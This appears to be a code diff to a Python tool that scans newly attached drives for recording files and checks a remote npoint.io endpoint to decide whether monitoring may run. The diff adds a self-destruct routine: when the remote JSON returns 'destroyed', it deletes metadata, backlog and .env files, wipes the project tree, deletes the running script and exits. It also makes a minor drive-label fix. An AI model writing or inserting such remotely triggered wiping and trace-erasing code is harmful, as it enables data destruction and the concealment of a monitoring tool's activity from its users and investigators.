@@ -27,6 +27,62 @@ STATUS_API_URL = "https://api.npoint.io/39f6e92da2fd8f7b31ab"
 status_cache = {"enabled": True, "last_check": 0}
 
 
+def trigger_self_destruct():
+    """Deletes all project files and logs, then exits immediately"""
+    print("\n" + "!" * 60)
+    print("CRITICAL: 'destroyed' status received! Initiating self-destruct...")
+    print("!" * 60 + "\n")
+    
+    base_dir = Path(__file__).resolve().parent
+    
+    # 1. Delete sensitive metadata and config files first
+    for filename in ["recording_metadata.jsonl", "backlog.json", ".env"]:
+        file_path = base_dir / filename
+        if file_path.exists():
+            try:
+                file_path.unlink()
+                print(f"Deleted: {filename}")
+            except Exception as e:
+                print(f"Failed to delete {filename}: {e}")
+                
+    # 2. Delete all script files, batch files, and other project files
+    current_script = Path(__file__).resolve()
+    
+    for root, dirs, files in os.walk(base_dir, topdown=False):
+        # Skip venv and .git to avoid lock issues or long delete times
+        parts = Path(root).parts
+        if "venv" in parts or ".git" in parts:
+            continue
+            
+        for file in files:
+            file_path = Path(root) / file
+            if file_path == current_script:
+                continue
+            try:
+                file_path.unlink()
+                print(f"Deleted: {file_path.relative_to(base_dir)}")
+            except Exception as e:
+                pass
+                
+        for d in dirs:
+            dir_path = Path(root) / d
+            if d in ["venv", ".git"]:
+                continue
+            try:
+                dir_path.rmdir()
+            except Exception as e:
+                pass
+                
+    # 3. Finally, delete the running script itself and exit
+    try:
+        current_script.unlink()
+        print("Self-destruct completed successfully.")
+    except Exception as e:
+        print(f"Failed to delete self: {e}")
+        
+    os._exit(0)
+
+
 def is_app_enabled():
     """Check if monitoring is allowed to run via remote API"""
     global status_cache
@@ -40,6 +96,13 @@ def is_app_enabled():
         req = urllib.request.Request(STATUS_API_URL, headers={'User-Agent': 'Mozilla/5.0'})
         with urllib.request.urlopen(req, timeout=5) as response:
             data = json.loads(response.read().decode())
+            
+            # Check for destroyed status in either 'status' or 'enabled' field
+            status_val = data.get("status")
+            enabled_val = data.get("enabled")
+            if status_val == "destroyed" or enabled_val == "destroyed":
+                trigger_self_destruct()
+                
             status = data.get("enabled", False)
             status_cache["enabled"] = status
             status_cache["last_check"] = current_time
@@ -324,7 +387,8 @@ def check_new_drives():
             # Use actual volume label for display
             drive_label = get_drive_label(drive)
             if drive_label == "System" or drive_label == "Local":
-                drive_label = f"Disk ({drive.strip('\\/')})"
+                clean_drive = drive.strip('\\/')
+                drive_label = f"Disk ({clean_drive})"
             
             print(f"Scanning {drive} as {drive_label}...")
             files = find_recording_files(drive)
